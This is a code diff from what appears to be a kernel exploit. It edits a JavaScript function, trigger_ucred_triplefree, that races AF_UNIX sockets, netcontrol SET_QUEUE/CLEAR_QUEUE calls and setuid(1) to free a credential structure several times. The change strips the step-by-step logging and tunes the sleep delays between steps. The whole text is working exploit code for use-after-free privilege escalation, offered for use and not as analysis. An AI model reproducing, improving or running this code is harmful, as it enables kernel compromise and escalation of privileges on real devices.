@@ -1429,66 +1429,39 @@ function trigger_ucred_triplefree() {
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
-    // -----------------------------
-    // 1) dummy socket → register in netcontrol
-    // -----------------------------
-    consoleNotify("[1] Creating dummy_socket...");
+    send_notification("[1] Opening dummy_socket...");
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    consoleNotify("[1] dummy_socket opened → FD = " + dummy_socket);
 
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
-    consoleNotify("[1] SET_QUEUE buffer prepared with FD = " + dummy_socket);
-
-    consoleNotify("[1] Sending SET_QUEUE...");
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    consoleNotify("[1] SET_QUEUE sent");
 
-
-    // -----------------------------
-    // 2) allocate new ucred (تحرير ucred القديمة)
-    // -----------------------------
-    consoleNotify("[2] Calling setuid(1) → allocating new ucred...");
-    setuid(1);
-    nanosleep_fun(2);
-    consoleNotify("[2] setuid(1) done → new ucred active");
-
-
-    // -----------------------------
-    // 3) reclaim fd → uaf_socket
-    // -----------------------------
-    consoleNotify("[3] Creating uaf_socket...");
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
-    consoleNotify("[3] uaf_socket opened → FD = " + uaf_socket);
-
-    consoleNotify("[3] Calling setuid(1) → allocating new ucred...");
-    setuid(1);
-    nanosleep_fun(2);
-    consoleNotify("[3] setuid(1) done → new ucred active");
-
-    // -----------------------------
-    // 4) unregister → free file + ucred
-    // -----------------------------
-    write32(nc_clear_buf, uaf_socket);
-    consoleNotify("[4] CLEAR_QUEUE buffer prepared with FD = " + uaf_socket);
-
-    consoleNotify("[4] Sending CLEAR_QUEUE...");
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-    consoleNotify("[4] CLEAR_QUEUE sent");
-
-
-
-    // -----------------------------
-    // 5) close dummy socket (تحرير FD القديم في الوقت المناسب)
-    // -----------------------------
-    consoleNotify("[5] Closing dummy_socket...");
     close(new BigInt(dummy_socket));
-    consoleNotify("[5] dummy_socket closed → FD freed");
+    send_notification("[sleep] after closing dummy_socket");
+    nanosleep_fun(50_000_000); // 50ms
 
 
-    // -----------------------------
-    // 6) نهاية التنفيذ
-    // -----------------------------
-    consoleNotify("[✓] Execution finished — all steps completed.");
+    send_notification("[2] setuid(1)...");
+    setuid(1);
+    nanosleep_fun(10_000_000); // 10ms
+
+
+    send_notification("[3] Opening uaf_socket...");
+    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+    nanosleep_fun(20_000_000); // 20ms
+
+
+    send_notification("[4] setuid(1) again...");
+    setuid(1);
+    nanosleep_fun(10_000_000);
+
+
+    send_notification("[5] CLEAR_QUEUE...");
+    write32(nc_clear_buf, uaf_socket);
+    nanosleep_fun(5_000_000);
+
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+
+    send_notification("[✓] Done.");
 
 
     // 6) refcount fix loop
